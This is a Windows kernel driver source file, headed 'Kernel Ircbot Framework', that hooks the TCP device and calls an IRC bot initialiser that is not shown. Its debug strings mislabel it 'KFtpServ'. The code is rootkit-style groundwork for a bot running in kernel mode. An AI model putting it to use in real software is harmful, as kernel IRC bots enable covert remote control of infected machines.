/*
	Kernel Ircbot Framework
    (c) Tibbar 2006.  If you wish to use this code in your own project please contact me
	at tibbar@tibbar.org to obtain permission.
*/


#ifdef KERNELMODE

#include "ntddk.h"
#include "KircBot.h"


// pointer to the lower TCP/IP device 
PDEVICE_OBJECT TcpIpDevice = NULL; 


VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("KFtpServ: OnUnload called\n");

}

NTSTATUS
OnStubDispatch(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP           Irp
    )
{
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    IoCompleteRequest (Irp,
                       IO_NO_INCREMENT
                       );
    return Irp->IoStatus.Status;
}


NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	int i = 0;
	UNICODE_STRING ntUnicodeString; 
	NTSTATUS ntStatus; 
	PFILE_OBJECT FileObject = NULL;

	DbgPrint("KFtpServ: DriverEntry called");

	// Register a dispatch function
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) 
	{
        	theDriverObject->MajorFunction[i] = OnStubDispatch;
    	}

	theDriverObject->DriverUnload  = OnUnload; 

	RtlInitUnicodeString( &ntUnicodeString, L"\\Device\\Tcp"); 

	ntStatus = IoGetDeviceObjectPointer(&ntUnicodeString, FILE_ALL_ACCESS, &FileObject, &TcpIpDevice);

	if(ntStatus == STATUS_SUCCESS) 
	{
		DbgPrint("found pointer to \\device\\tcp");
		irc_initialise();
	}
	if(ntStatus != STATUS_SUCCESS) DbgPrint("failed to find pointer to \\device\\tcp");

	return STATUS_SUCCESS;
}

#endif